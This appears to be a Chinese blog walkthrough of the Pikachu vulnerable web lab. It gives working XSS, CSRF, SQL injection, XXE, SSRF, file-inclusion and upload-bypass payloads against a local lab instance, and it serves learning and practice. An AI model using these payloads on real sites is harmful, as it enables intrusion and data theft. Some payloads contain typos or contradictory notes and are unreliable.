<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201102210221.png" alt="image-20220201102210221"></p>
<p>线程设置为1</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201102317701.png" alt="image-20220201102317701"></p>
<p>设置一下获取的token</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201102409707.png" alt="image-20220201102409707"></p>
<p>选择总是</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201103151781.png" alt="image-20220201103151781"></p>
<p>选择递归搜索，把上一个token填进去</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201110843373.png" alt="image-20220201110843373"></p>
<p>发现密码</p>
<h1 id="xss跨站脚本漏洞"><a href="#xss跨站脚本漏洞" class="headerlink" title="xss跨站脚本漏洞"></a>xss跨站脚本漏洞</h1><h2 id="1-反射型xss-get"><a href="#1-反射型xss-get" class="headerlink" title="1.反射型xss(get)"></a>1.反射型xss(get)</h2><p>因为在输入框有输入限制，我们就直接在url中添加参数</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201112154043.png" alt="image-20220201112154043"></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201112158872.png" alt="image-20220201112158872"></p>
<h2 id="2-反射性xss-post"><a href="#2-反射性xss-post" class="headerlink" title="2.反射性xss(post)"></a>2.反射性xss(post)</h2><p>先用123456的账号密码登录上去</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201113436342.png" alt="image-20220201113436342"></p>
<p>然后就可以了</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201114104514.png" alt="image-20220201114104514"></p>
<p>当然我们也有很多的绕过方式</p>
<p><code>&lt;sCRIPT&gt;alert(&#39;1&#39;)&lt;/script&gt;</code></p>
<p><code>&lt;sCRIPT&gt;alert(/xss/)&lt;/script&gt;</code>用<code>//</code>代替<code>&quot;&quot;</code></p>
<p>都可以</p>
<h2 id="3-存储型xss"><a href="#3-存储型xss" class="headerlink" title="3.存储型xss"></a>3.存储型xss</h2><p>还是用上面的payload<code>&lt;sCRIPT&gt;alert(/xss/)&lt;/script&gt;</code></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201114843672.png" alt="image-20220201114843672"></p>
<h2 id="4-DOM型xss"><a href="#4-DOM型xss" class="headerlink" title="4.DOM型xss"></a>4.DOM型xss</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201115819085.png" alt="image-20220201115819085"></p>
<p>通过审查元素我们可以发现我们在点击按钮之后，这个标签里面的属性就会改变我们要做的就是把它弄成超链接，</p>
<p>onclick 事件会在对象被点击时发生，然后弹出我们的xss，记得闭合我们的标签符号</p>
<p><code>&#39;onclick=&quot;alert(123)&quot;&gt;</code></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201120149233.png" alt="image-20220201120149233"></p>
<h2 id="5-DOM型xss"><a href="#5-DOM型xss" class="headerlink" title="5.DOM型xss"></a>5.DOM型xss</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201121609094.png" alt="image-20220201121609094"></p>
<p>可以看到上面的标签在点击下面的标签之后内容就会变成输入框里面的内容，我们还是用onclick事件。</p>
<p><code>&#39;onclick=&quot;alert(123)&quot;&gt;</code></p>
<h2 id="6-xss盲打"><a href="#6-xss盲打" class="headerlink" title="6.xss盲打"></a>6.xss盲打</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201130503164.png" alt="image-20220201130503164"></p>
<p>先把payload注入进去</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201130521691.png" alt="image-20220201130521691"></p>
<p>登录进去看看</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201130606293.png" alt="image-20220201130606293"></p>
<p>存在漏洞</p>
<h2 id="7-xss之过滤"><a href="#7-xss之过滤" class="headerlink" title="7.xss之过滤"></a>7.xss之过滤</h2><p>看题目就知道有过滤，我们直接使用上面提到的绕过的payload</p>
<p>拼凑:<code>&lt;scri&lt;script&gt;pt&gt;alert(/xss/)&lt;/scr&lt;/script&gt;pt&gt;</code></p>
<p><code>&lt;sCRIPT&gt;alert(/xss/)&lt;/scriPt&gt;</code></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201130839329.png" alt="image-20220201130839329"></p>
<h2 id="8-xss之htmlspecialchars"><a href="#8-xss之htmlspecialchars" class="headerlink" title="8.xss之htmlspecialchars"></a>8.xss之htmlspecialchars</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201131532369.png" alt="image-20220201131532369"></p>
<p>由于输入的地方出现了特殊字符，所以被记录下来了，但是发现记录的标签也可以进行注入，那我们继续使用onclick事件</p>
<p><code>&#39;onclick=&#39;alert(/xss/)&#39;</code></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201131717082.png" alt="image-20220201131717082"></p>
<h2 id="9-xss之href输出"><a href="#9-xss之href输出" class="headerlink" title="9.xss之href输出"></a>9.xss之href输出</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201131817651.png" alt="image-20220201131817651"></p>
<p>用oncilck事件没有成功</p>
<p>我们还是按常理输出，然后点击查看查看元素发现，这次的输出是在href中，但是这次代码将双引号进行了过滤，是不是这样不能执行xss代码了呢，当然不是，输出在a标签里的href属性，可以使用js协议来执行js</p>
<p><code>javascript:alert(/xss/)</code></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201132454361.png" alt="image-20220201132454361"></p>
<h2 id="10-xss之js输出"><a href="#10-xss之js输出" class="headerlink" title="10.xss之js输出"></a>10.xss之js输出</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201132657030.png" alt="image-20220201132657030"></p>
<p>可以看到直接被拼接进了代码中，那我们直接对他进行闭合</p>
<p><code>&#39;&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201132823975.png" alt="image-20220201132823975"></p>
<h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h1><p>Cross-site request forgery  简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。                         很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。</p>
<h2 id="1-CSRF-get"><a href="#1-CSRF-get" class="headerlink" title="1.CSRF(get)"></a>1.CSRF(get)</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201154952242.png" alt="image-20220201154952242"></p>
<p>发现请求是这样的，我们可以伪造这样的请求，登录lili的账号之后让lili点这个链接，然后就会发现lili的个人信息被修改了</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201155130031.png" alt="image-20220201155130031"></p>
<h2 id="2-CSRF-post"><a href="#2-CSRF-post" class="headerlink" title="2.CSRF(post)"></a>2.CSRF(post)</h2><p>第二关post也一样，我们伪造一个就好了。</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201155542980.png" alt="image-20220201155542980"></p>
<p>他的信息是在post里面的，那我们伪造一个包。</p>
<p>但是我不知道怎么发出去，看了下答案，需要伪造一个站点，别人点你站点中的按钮的时候，就可以自动向那个网站发一个修改个人信息的请求。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"> </span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"> </span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">&quot;postsubmit&quot;</span>).click();</span></span><br><span class="line"><span class="javascript"> </span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"> </span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://www.tests.com/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;body&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456789&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;usa&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;vince@pikachu.com&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="token"><a href="#token" class="headerlink" title="token"></a>token</h3><p>如果有token的话看网上说的就无法绕过了。</p>
<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>又到了我最喜欢的sql注入时间</p>
<h2 id="1-数字型注入"><a href="#1-数字型注入" class="headerlink" title="1.数字型注入"></a>1.数字型注入</h2><p>直接在hackbar里面用or 1=1</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201160657534.png" alt="image-20220201160657534"></p>
<p>成功</p>
<h2 id="2-字符型注入"><a href="#2-字符型注入" class="headerlink" title="2.字符型注入"></a>2.字符型注入</h2><p><code>kobe&#39; or &quot;1&quot; = &quot;1&quot;#</code></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201161344643.png" alt="image-20220201161344643"></p>
<p>成功</p>
<h2 id="3-搜索型注入"><a href="#3-搜索型注入" class="headerlink" title="3.搜索型注入"></a>3.搜索型注入</h2><p><code>kobe&#39; or &quot;1&quot; = &quot;1&quot;#</code></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201161811993.png" alt="image-20220201161811993"></p>
<h2 id="4-xx型注入"><a href="#4-xx型注入" class="headerlink" title="4.xx型注入"></a>4.xx型注入</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201161919392.png" alt="image-20220201161919392"></p>
<p>上面的payload被过滤了，但是依然报错，开始尝试绕过。</p>
<p><code>&#39;)or 1=1 #</code></p>
<p>成功绕过<img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201163008834.png" alt="image-20220201163008834"></p>
<h2 id="5-insert-update"><a href="#5-insert-update" class="headerlink" title="5.insert/update"></a>5.insert/update</h2><p>首先了解下updatexml()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value);</span><br></pre></td></tr></table></figure>

<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p>
<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
<p>作用：改变文档中符合条件的节点的值</p>
<p>改变XML_document中符合XPATH_string的值</p>
<p>而我们的注入语句为：<code>updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code></p>
<p>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出。</p>
<p><code>xxx&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;</code></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201171910421.png" alt="image-20220201171910421"></p>
<h2 id="6-delete注入"><a href="#6-delete注入" class="headerlink" title="6.delete注入"></a>6.delete注入</h2><p>打开burpsuite然后点击删除，抓到包后发送到重发器然后在56后面加上我们的语句</p>
<p>+or+updatexml(1,comcat(0x7e,database()),0)因为这里传的是数值型，我们就不用单引号闭合，直接or就行了，这样就完成了我们的注入</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201172931918.png" alt="image-20220201172931918"></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/20200423101230931.png" alt="img"></p>
<h2 id="7-http头注入"><a href="#7-http头注入" class="headerlink" title="7.http头注入"></a>7.http头注入</h2><p>我们的信息被记录了，那有可能是记录在数据库了</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201174404449.png" alt="image-20220201174404449"></p>
<p>可能又是insert</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201175400728.png" alt="image-20220201175400728"></p>
<p>在user-agent完整注入</p>
<h2 id="8-基于boolian的盲注"><a href="#8-基于boolian的盲注" class="headerlink" title="8.基于boolian的盲注"></a>8.基于boolian的盲注</h2><p>kobe’ and ascii(substr(database(),1,1))=112#</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201180541316.png" alt="image-20220201180541316"></p>
<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="9-时间盲注"><a href="#9-时间盲注" class="headerlink" title="9.时间盲注"></a>9.时间盲注</h2><p>时间盲注主要使用if语句，通过延迟信息进行判断，不看回显信息</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201181336356.png" alt="image-20220201181336356"></p>
<p>右击审查元素</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201181340785.png" alt="image-20220201181340785"></p>
<p>然后点击网络，再从上面提交上去，可以看到时间执行了5.12秒，说明有盲注</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201181344988.png" alt="image-20220201181344988"></p>
<p>kobe’ and if ((substr(database(),1,1))=’a’,sleep=(5),null)#</p>
<p>构造了另一条代码</p>
<p>此时1ms就返回结果,说明数据库名第一位不是a<br>将a改为p,则一直不返回结果<br>说明数据库名第一位不是a</p>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。                    </p>
<h2 id="1-ping"><a href="#1-ping" class="headerlink" title="1.ping"></a>1.ping</h2><p>命令执行</p>
<p>经常遇到，但是由于我们是windows系统，我们要用whoami命令</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201182310878.png" alt="image-20220201182310878"></p>
<p>最下面可以看到结果</p>
<h2 id="2-exec-“eval”"><a href="#2-exec-“eval”" class="headerlink" title="2.exec “eval”"></a>2.exec “eval”</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201182644246.png" alt="image-20220201182644246"></p>
<p>eval把字符串当做代码来执行。</p>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。</p>
<h2 id="1-本地包含"><a href="#1-本地包含" class="headerlink" title="1.本地包含"></a>1.本地包含</h2><p>先在本地建立一个敏感文件</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201183902587.png" alt="image-20220201183902587"></p>
<p>file传参的时候包含这个文件</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201183916344.png" alt="image-20220201183916344"></p>
<h2 id="2-远程包含"><a href="#2-远程包含" class="headerlink" title="2.远程包含"></a>2.远程包含</h2><p><code>http://192.168.32.104/pikachu/vul/fileinclude/fi_remote.php?filename=http://192.168.32.104/pikachu\vul\fileinclude/test.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</code></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201184427302.png" alt="image-20220201184427302"></p>
<h1 id="不安全的文件下载"><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h1><p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后                        会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。                        如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201185131158.png" alt="image-20220201185131158"></p>
<p>下载抓包发现文件，我们把我们的敏感文件下载下来</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201185216830.png" alt="image-20220201185216830"></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201185219777.png" alt="image-20220201185219777"></p>
<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>这个也简单</p>
<h2 id="1-客户端check"><a href="#1-客户端check" class="headerlink" title="1.客户端check"></a>1.客户端check</h2><p>看标题就知道是js嘛</p>
<p>先用jpg上传，然后在burp包里修改文件的后缀名，就可以绕过前端检测</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201194924964.png" alt="image-20220201194924964"></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201195341874.png" alt="image-20220201195341874"></p>
<p>获得shell</p>
<h2 id="2-服务端check，MIME"><a href="#2-服务端check，MIME" class="headerlink" title="2.服务端check，MIME"></a>2.服务端check，MIME</h2><p>可以用一句话木马图片绕过，当然也可以直接修改mime</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201195459029.png" alt="image-20220201195459029"></p>
<p>上传成功</p>
<h2 id="3-getimagesize"><a href="#3-getimagesize" class="headerlink" title="3.getimagesize()"></a>3.getimagesize()</h2><p>getimagesize()简介<br>这个函数功能会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的</p>
<p>直接上传一个图片，然后在里面注入我们的恶意代码</p>
<p>然后用之前的包含漏洞包含我们的图片就可以了</p>
<h1 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h1><p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。                </p>
<p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。                </p>
<h2 id="1-水平越权"><a href="#1-水平越权" class="headerlink" title="1.水平越权"></a>1.水平越权</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201204858787.png" alt="image-20220201204858787"></p>
<p>得知这些账号</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201212328598.png" alt="image-20220201212328598"></p>
<p>把lucy的包伪造成lili的</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201212413880.png" alt="image-20220201212413880"></p>
<p>成功水平越权</p>
<h2 id="2-垂直越权"><a href="#2-垂直越权" class="headerlink" title="2.垂直越权"></a>2.垂直越权</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201212454749.png" alt="image-20220201212454749"></p>
<p>我们的目标就是用pikachu使用root的功能</p>
<p>先登录admin获取一个创建用户的包</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201213354562.png" alt="image-20220201213354562"></p>
<p>然后需要把我们普通用户的cookie替换上去，这样在登录普通用户的情况下就可以实现垂直越权</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201213501343.png" alt="image-20220201213501343"></p>
<p>可以看到用户被添加进去了</p>
<h1 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h1><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201214157517.png" alt="image-20220201214157517"></p>
<p>目录遍历，可以读取目录中的任意文件。</p>
<h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201215102010.png" alt="image-20220201215102010"></p>
<p>源代码中有测试账号可以看到。</p>
<p>直接就登录进去了，我还用dirsearch扫了半天。。</p>
<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>(๑╹◡╹)ﾉ”ez啦~</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201220501911.png" alt="image-20220201220501911"></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201220448090.png" alt="image-20220201220448090"></p>
<p>我们先来一个正常的试一下。</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201220533182.png" alt="image-20220201220533182"></p>
<p>报错了。</p>
<p>好的不会了，序列化一生之敌！！！！！！！！！！！</p>
<p><a href="https://blog.csdn.net/qq_43233085/article/details/104143518">(38条消息) pikachu靶场 ：十二、PHP反序列化_CNwanku的博客-CSDN博客_pikachu 反序列化</a></p>
<h1 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h1><p>XXE -“xml external entity injection”<br>                既”xml外部实体注入漏洞”。<br>                概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”<br>                也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p>
<pre><code>            具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。                
            现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。
            以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。
            
            本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。             
</code></pre>
<p>xxe我也不是很会，过几天学一学</p>
<p><code>&lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE note [   &lt;!ENTITY hacker &quot;xxe&quot;&gt; ]&gt; &lt;name&gt;&amp;hacker;&lt;/name&gt;</code></p>
<p>这个是payload</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201223315820.png" alt="image-20220201223315820"></p>
<h1 id="url重定向"><a href="#url重定向" class="headerlink" title="url重定向"></a>url重定向</h1><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201223138435.png" alt="image-20220201223138435"></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201223147548.png" alt="image-20220201223147548"></p>
<p>感觉和远程文件包含差不多</p>
<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201223415905.png" alt="image-20220201223415905"></p>
<p>发现后面跟了个url参数</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201223448116.png" alt="image-20220201223448116"></p>
<p>伪造一个url</p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201223500719.png" alt="image-20220201223500719"></p>
<h2 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content"></a>file_get_content</h2><p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201223540152.png" alt="image-20220201223540152"></p>
<p>又有参数<img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201223600441.png" alt="image-20220201223600441"></p>
<p>额</p>
<p>搜了下正确的用法是用伪协议读取文件</p>
<p><code>192.168.32.104/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=http://127.0.0.1/phpinfo.php</code></p>
<p><img src="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20220201223723101.png" alt="image-20220201223723101"></p>
<p>base读取成功</p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>php代码审计学习笔记1</title>
    <url>/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
